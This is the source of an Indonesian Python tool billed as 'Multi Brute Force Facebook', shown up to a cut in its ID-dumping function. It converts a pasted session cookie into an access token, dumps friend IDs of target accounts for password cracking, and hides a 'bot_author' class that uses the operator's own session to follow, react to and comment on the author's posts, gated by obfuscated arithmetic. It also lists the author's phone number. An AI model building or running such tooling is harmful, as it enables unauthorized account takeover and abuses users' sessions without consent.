###----------[ AUTHOR & CREATOR ]---------- ###
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Version   = '0.6'
Denventa  = 1827084332
Postingan = 10217173381366429

###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

###----------[ TIME ]---------- ###
id_dev = 345 - 340 + 720 - 723
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

###----------[ APPEND ]---------- ###
OK = []
CP = []
num_list = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]

###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Author)    +  Codename
sakira = len(Facebook)  +  Codename
sakura = len(Instagram) +  Codename
sakera = len(Whatsapp)  +  Codename
sakora = len(YouTube)   +  Codename
ip_log = Denventa * id_dev - 3654168663

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('\n   %s[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
    print('       %s• %sTidak Dapat Mengeksekusi %s\n'%(M,A,error))
    print('   %s[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
    print('       %s• %sCookies/Token Invalid'%(M,A))
    print('       %s• %sSalah Memasukkan ID'%(M,A))
    print('       %s• %sBug Pada Source Code'%(M,A))
    print('       %s• %sBug Pada Requests'%(M,A))
    print('       %s• %sDan Lain-Lain\n'%(M,A))
    print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
    print('       %s• %spython sakera.py\n'%(M,A))
    exit()

###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id:self.get_folls(x,cookie);self.get_likers(x,cookie);self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,id,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s?v=timeline'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Sedih','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    if ip_log != 1:pass
                    else:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)

###----------[ LOGO ]---------- ###
def poster():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(J,P,J,P,J,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,J,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(J,P,J,P,J,P,J,P,J,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(J,P,J,P,J,P,J,P,J,P,J,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,J,Version,P,J))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster2():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(H,P,H,P,H,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,H,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(H,P,H,P,H,P,H,P,H,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(H,P,H,P,H,P,H,P,H,P,H,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,H,Version,P,H))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster3():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(B,P,B,P,B,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,B,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(B,P,B,P,B,P,B,P,B,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(B,P,B,P,B,P,B,P,B,P,B,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,B,Version,P,B))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Dump
    try:os.mkdir("dump")
    except:pass
    # Make Directory Pass
    try:os.mkdir("tool")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Make Directory License
    try:os.mkdir("license")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass

###----------[ LOGIN ]---------- ###
def login():
    resik()
    mkdir_data_login()
    poster()
    print('\n%s[%s•%s] %sJangan Gunakan Akun Pribadi %s!'%(M,P,M,P,M))
    cookie = str(input('%s[%s•%s] %sMasukkan Cookies %s: %s'%(J,P,J,P,J,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('login/cookie.json','w').write(cookie)
        open('login/token.json','w').write(token)
        tampilan_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ MENU ]---------- ###
def user(nama):
    print(''%())
    print('        %s[%s•%s] %sHello %s%s %s!'%(J,P,J,P,J,nama,P))
    print('        %s[%s•%s] %sYour License Will Expire In %s7 %sDays'%(J,P,J,P,A,P))
def tampilan_menu():
    resik()
    try:open('tool/useragent.json','r').read()
    except Exception as ERROR:
        resik()
        poster2()
        print('')
        tamp_new = (f'   {P2}Hi! Sepertinya Kamu Adalah Pengguna Baru. Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Sebelum Menggunakan SC Ini, Kamu Harus Mengatur User Agent Dahulu! Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {H2}- Denventa -')
        printer(Panel(tamp_new,title=f'{H2}[ {P2}Welcome User {H2}]',width=54,padding=(1,4),style='#00FF00'))
        print('')
        useragent('new')
    poster()
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        language(cookie)
        get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
        jsx = json.loads(get.text)
        nama = jsx["name"]
        user(nama)
        print(''%())
        tampilan_menu = f"""  {J2}[{A2}01{J2}] {P2}Publik    {J2}[{A2}06{J2}] {P2}Komentar {J2}[{A2}11{J2}] {A2}Email
  {J2}[{A2}02{J2}] {P2}Followers {J2}[{A2}07{J2}] {P2}Grup     {J2}[{A2}12{J2}] {A2}Username    
  {J2}[{A2}03{J2}] {P2}Nama      {J2}[{A2}08{J2}] {P2}Hashtag  {J2}[{A2}13{J2}] {A2}ID Random   
  {J2}[{A2}04{J2}] {P2}Likers    {J2}[{A2}09{J2}] {A2}Beranda  {J2}[{A2}14{J2}] {A2}Teman Masuk 
  {J2}[{A2}05{J2}] {P2}Pesan     {J2}[{A2}10{J2}] {A2}File     {J2}[{A2}15{J2}] {A2}Teman Keluar

       {J2}[{A2}16{J2}] {A2}Cek Hasil       {J2}[{A2}19{J2}] {P2}User Agent
       {J2}[{A2}17{J2}] {A2}Cek Opsi        {J2}[{A2}20{J2}] {A2}Upgrade Pro
       {J2}[{A2}18{J2}] {A2}Cek Teman       {J2}[{A2}00{J2}] {P2}Log Out"""
        printer(Panel(tampilan_menu,title=f'{J2}[ {P2}Menu {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
        pilih_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);login()
def pilih_menu():
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']    : publik();system_login();metode();urut_crack();addpass();crack()
    elif dc in ['2','02','b']  : main_folls();system_login();metode();urut_crack();addpass();crack()
    elif dc in ['3','03','c']  : namee()
    elif dc in ['4','04','d']  : main_likers();system_login();metode();addpass();crack()
    elif dc in ['5','05','e']  : message();system_login();metode();addpass();crack()
    elif dc in ['6','06','f']  : komen();system_login();metode();addpass();crack()
    elif dc in ['7','07','g']  : grup()
    elif dc in ['8','08','h']  : hashtag();system_login();metode();addpass();crack()
    elif dc in ['9','09','i']  : not_available('Dump ID Dari Beranda')
    elif dc in ['10','010','j']: not_available('Dump ID Dari File')
    elif dc in ['11','011','k']: not_available('Dump ID Dari Email')
    elif dc in ['12','012','l']: not_available('Dump ID Dari Username')
    elif dc in ['13','013','m']: not_available('Dump ID Dari ID Random')
    elif dc in ['14','014','n']: not_available('Dump ID Dari Teman Masuk')
    elif dc in ['15','015','o']: not_available('Dump ID Dari Teman Keluar')
    elif dc in ['16','016','p']: not_available('Cek Hasil Crack')
    elif dc in ['17','017','q']: not_available('Cek Opsi Akun Hasil Crack')
    elif dc in ['18','018','r']: not_available('Cek Jumlah Teman Akun Target')
    elif dc in ['19','019','s']: useragent('old')
    elif dc in ['20','020','t']: not_available('Upgrade Ke Versi Pro')
    elif dc in ['0','00','z']:
        resik()
        poster3()
        print('')
        tamp_logout1 = (f'   {P2}Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {B2}- Denventa -')
        tamp_logout2 = f'''{P2}Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :
    {B2}• {P2}Token/Cookies
    {B2}• {P2}File Dump
    {B2}• {P2}File Tools'''
        printer(Panel(tamp_logout1,title=f'{B2}[ {P2}Goodbye {B2}]',width=54,padding=(1,4),style='#00C8FF'))
        print('')
        printer(Panel(tamp_logout2,title=f'{B2}[ {P2}Log Out {B2}]',width=54,padding=(1,4),style='#00C8FF'))
        input('\n               %s[ %sEnter Untuk Log Out %s]'%(B,P,B))
        try:shutil.rmtree('login')
        except:pass
        try:shutil.rmtree('dump')
        except:pass
        exit('\n\n')
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ USER AGENT ]---------- ###
def useragent(isi):
    global pengguna_source_code
    pengguna_source_code = isi
    try:os.mkdir("tool")
    except:pass
    pilih_menu_user_agent()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:scrap_useragent()
    elif dc in ['2','02','b']:pilih_otomatis()
    elif dc in ['3','03','c']:manual_user_agent()
    elif dc in ['4','04','d']:ua_device_ini()
    elif dc in ['5','05','e']:cek_user_agent()
    elif dc in ['0','00','z']:tampilan_menu()
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_menu_user_agent():
    tampilan_menu_user_agent = f'''  {J2}[{A2}01{J2}] {P2}Scrap UA Browser    {J2}[{A2}04{J2}] {P2}Cari UA HP Ini
  {J2}[{A2}02{J2}] {P2}Ganti UA Otomatis   {J2}[{A2}05{J2}] {P2}Cek UA Digunakan
  {J2}[{A2}03{J2}] {P2}Ganti UA Manual     {J2}[{A2}00{J2}] {P2}Kembali'''
    printer(Panel(tampilan_menu_user_agent,title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def pilih_device():
    tampilan_device = f'''   {J2}[{A2}01{J2}] {P2}Samsung    {J2}[{A2}05{J2}] {P2}Vivo      {J2}[{A2}09{J2}] {P2}Huawei
   {J2}[{A2}02{J2}] {P2}Nokia      {J2}[{A2}06{J2}] {P2}Iphone    {J2}[{A2}10{J2}] {P2}Windows
   {J2}[{A2}03{J2}] {P2}Xiaomi     {J2}[{A2}07{J2}] {P2}Asus      {J2}[{A2}11{J2}] {P2}Chrome
   {J2}[{A2}04{J2}] {P2}Oppo       {J2}[{A2}08{J2}] {P2}Lenovo    {J2}[{A2}12{J2}] {P2}FB'''
    printer(Panel(tampilan_device,title=f'{J2}[ {P2}Device {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def scrap_useragent():
    data_ua = {}
    pt = 0
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:     type = 'software_name/samsung-browser'
    elif dc in ['2','02','b']:   type = 'software_name/nokia-browser'
    elif dc in ['3','03','c']:   type = 'operating_platform_string/xiaomi-mi-a1'
    elif dc in ['4','04','d']:   type = 'operating_platform_string/oppo-f1s-a1601'
    elif dc in ['5','05','e']:   type = 'operating_platform_string/vivo'
    elif dc in ['6','06','f']:   type = 'operating_platform_string/apple'
    elif dc in ['7','07','g']:   type = 'operating_platform_string/asus'
    elif dc in ['8','08','h']:   type = 'operating_platform_string/lenovo'
    elif dc in ['9','09','i']:   type = 'operating_platform_string/huawei'
    elif dc in ['10','010','j']: type = 'operating_system_name/windows'
    elif dc in ['11','011','k']: type = 'operating_system_name/chrome-os'
    elif dc in ['12','012','l']: type = 'software_name/facebook-app'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    url = 'https://developers.whatismybrowser.com/useragents/explore/' + type
    with requests.Session() as xyz:
        req = xyz.get(url)
        pra = par(req.content,'html.parser')
        li = re.findall('<td><a class=\".*?\" href=\".*?\">(.*?)</a></td>',str(pra))
        for y in li:
            try:
                x = f'{A2}'+y
                pt += 1
                pu = str(pt)
                data_ua.update({pu:x.replace('[#AAAAAA]','')})
                printer(Panel(x,title=f'{J2}[{P2}{pu}{J2}]',width=54,title_align='left',style='#FF8F00'))
                time.sleep(2)
            except KeyboardInterrupt:break
    ch = int(input('   %s└──> %s'%(A,J)))
    try:
        open('tool/useragent.json','w').write(data_ua[str(ch)])
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_otomatis():
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['0','00','z']:     open('tool/useragent.json','w').write(ua_default)
    elif dc in ['1','01','a']:   open('tool/useragent.json','w').write(ua_samsung)
    elif dc in ['2','02','b']:   open('tool/useragent.json','w').write(ua_nokia)
    elif dc in ['3','03','c']:   open('tool/useragent.json','w').write(ua_xiaomi)
    elif dc in ['4','04','d']:   open('tool/useragent.json','w').write(ua_oppo)
    elif dc in ['5','05','e']:   open('tool/useragent.json','w').write(ua_vivo)
    elif dc in ['6','06','f']:   open('tool/useragent.json','w').write(ua_iphone)
    elif dc in ['7','07','g']:   open('tool/useragent.json','w').write(ua_asus)
    elif dc in ['8','08','h']:   open('tool/useragent.json','w').write(ua_lenovo)
    elif dc in ['9','09','i']:   open('tool/useragent.json','w').write(ua_huawei)
    elif dc in ['10','010','j']: open('tool/useragent.json','w').write(ua_windows)
    elif dc in ['11','011','k']: open('tool/useragent.json','w').write(ua_chrome)
    elif dc in ['12','012','l']: open('tool/useragent.json','w').write(ua_fb)
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    try:
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def manual_user_agent():
    usera = input('       %s[%s•%s] %sMasukkan User Agent :\n%s'%(J,P,J,P,J))
    if usera in ['',' ','  ','   ']:print('\n       %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));manual_user_agent()
    else:open('tool/useragent.json','w').write(usera);cek_user_agent()
def ua_device_ini():
    url = 'https://www.google.com/search?q=my+user+agent'
    try:
        if "linux" in sys.platform.lower():chrome_path = '/usr/bin/google-chrome %s';webbrowser.get(chrome_path).open(url)
        elif "win" in sys.platform.lower():chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s';webbrowser.get(chrome_path).open(url)
        else:chrome_path = 'open -a /Applications/Google\ Chrome.app %s';webbrowser.get(chrome_path).open(url)
        manual_user_agent()
    except Exception as e:print('\n   %s[%s•%s] %sTidak Dapat Menemukan Useragent %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);tampilan_menu()
def cek_user_agent():
    try:
        usera = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{usera}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Saat Ini {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        input('\n   %s[ %sKembali %s]'%(J,P,J))
        tampilan_menu()
    except Exception as e:kecuali(e)

###----------[ DUMP ID PUBLIC ]---------- ###
def publik():
    global file_dump
    try:
        try:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
        except:
            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
            time.sleep(3)
            login()
        print('       %s[%s•%s] %sContoh : 1827084332,607801156'%(J,P,J,P))
        tid = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
        file_dump = 'dump/%s.json'%(tid[0])
        try:os.remove(file_dump)
        except:pass
        for id in tid :
            try:
                url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
                with requests.Session() as xyz:
                    jso = json.loads(xyz.get(url,cookies=cookie).text)
                    for d in jso["friends"]["data"]:
                        try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
                        except:continue
            except Exception as e:kecuali(e)
